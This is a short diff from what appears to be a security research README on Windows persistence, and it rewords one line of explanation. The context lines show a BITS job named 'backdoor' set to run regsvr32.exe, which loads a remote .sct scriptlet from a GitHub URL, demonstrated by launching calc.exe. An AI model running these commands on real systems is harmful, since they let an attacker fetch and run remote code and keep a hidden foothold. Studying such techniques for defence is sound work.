@@ -15,7 +15,7 @@ bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.gith
 bitsadmin /Resume backdoor
 ```
 
-(3)as the gif shows,it will run the following command to start a calc.exe:
+(3)Then it will run the following command to start a calc.exe:
 ```
 regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll
 ```
